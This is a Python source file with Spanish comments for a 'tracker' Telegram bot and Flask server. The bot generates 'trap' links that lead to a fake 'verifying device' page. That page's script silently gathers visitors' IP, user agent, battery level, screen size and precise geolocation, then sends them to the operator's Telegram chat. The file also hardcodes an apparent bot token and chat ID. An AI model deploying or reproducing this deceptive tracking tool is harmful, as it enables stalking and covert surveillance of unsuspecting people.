import telebot
from flask import Flask, request, jsonify
import threading
import random
import string
import os
import time

# ================= CONFIGURACIÓN =================
TOKEN = '8740631074:AAHdTif9cw9BgLJ1lvuNEUTztYoH1zbxd6w'
TU_CHAT_ID = '2107923970'
PUERTO = 5000
# IMPORTANTE: Cambia esto por tu URL de ngrok
BASE_URL = 'https://d00f0d47fb1ffd1b-181-55-68-12.serveousercontent.com'

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN, threaded=False)
links_activos = {}

def generar_id_unico(longitud=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=longitud))

def enviar_telegram(mensaje):
    try:
        bot.send_message(TU_CHAT_ID, mensaje, parse_mode="HTML")
    except Exception as e:
        print(f"Error: {e}")

# ================= COMANDOS DEL BOT =================
@bot.message_handler(commands=['start', 'generar'])
def comando_generar(message):
    id_unico = generar_id_unico()
    # USAR BASE_URL en lugar de request.host_url
    url_trampa = f"{BASE_URL}/t/{id_unico}"
    
    links_activos[id_unico] = {
        'creator': message.from_user.username,
        'url': url_trampa
    }
    
    texto = f"🎯 <b>Link Generado</b>\n\n"
    texto += f"🔗 <code>{url_trampa}</code>\n\n"
    texto += f"⚠️ <i>Envía este link. Cuando lo abran, recibirás los datos.</i>"
    
    bot.reply_to(message, texto, parse_mode="HTML")

# ================= RUTAS WEB =================
@app.route('/')
def home():
    return "<h1>🤖 Bot Tracker Activo</h1><p>Usa /generar en Telegram</p>"

@app.route('/t/<id_link>')
def servir_trampa(id_link):
    if id_link not in links_activos:
        return "❌ Link inválido", 404
    return HTML_TRAMPA, 200

@app.route('/api/capturar/<id_link>', methods=['POST'])
def recibir_datos(id_link):
    if id_link not in links_activos:
        return jsonify({"status": "invalid"}), 404

    datos = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = f"🚨 <b>¡NUEVO VISITANTE!</b>\n\n"
    msg += f"🌐 <b>IP:</b> <code>{ip}</code>\n"
    msg += f"📱 <b>Dispositivo:</b> {datos.get('userAgent', '?')[:50]}...\n"
    msg += f"🔋 <b>Batería:</b> {datos.get('bateria', '?')}%\n"
    msg += f"🌍 <b>Ubicación:</b> {datos.get('lat', '❌ No')}, {datos.get('lon', '❌ No')}\n"
    msg += f"🖥️ <b>Pantalla:</b> {datos.get('screen', '?')}\n"
    
    enviar_telegram(msg)
    return jsonify({"status": "ok"}), 200

# ================= HTML DE LA TRAMPA =================
HTML_TRAMPA = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificando...</title>
<style>
body{background:#0f0f1a;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.spinner{width:40px;height:40px;border:4px solid #333;border-top:#6366f1;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div style="text-align:center"><div class="spinner" style="margin:0 auto 20px"></div><p>Verificando dispositivo...</p></div>
<script>
async function capturar(){
  const id=window.location.pathname.split('/')[2];
  const datos={
    userAgent:navigator.userAgent,
    screen:window.screen.width+'x'+window.screen.height,
    bateria:'N/A',
    lat:'N/A',
    lon:'N/A'
  };
  if('getBattery' in navigator){
    try{const b=await navigator.getBattery();datos.bateria=Math.round(b.level*100);}catch(e){}
  }
  if('geolocation' in navigator){
    navigator.geolocation.getCurrentPosition(
      p=>{datos.lat=p.coords.latitude.toFixed(5);datos.lon=p.coords.longitude.toFixed(5);enviar();},
      ()=>enviar()
    );
  }else enviar();
  
  async function enviar(){
    await fetch('/api/capturar/'+id,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(datos)});
  }
}
capturar();
</script>
</body>
</html>
"""

# ================= FUNCIONES DE INICIO =================
def iniciar_bot():
    print("🤖 Bot iniciado...")
    bot.infinity_polling()

def iniciar_flask():
    print(f"🌐 Servidor en puerto {PUERTO}...")
    app.run(host='0.0.0.0', port=PUERTO, threaded=True)

if __name__ == '__main__':
    print("✨ Iniciando Tracker Bot...")
    print(f"📍 Base URL: {BASE_URL}")
    threading.Thread(target=iniciar_flask, daemon=True).start()
    iniciar_bot()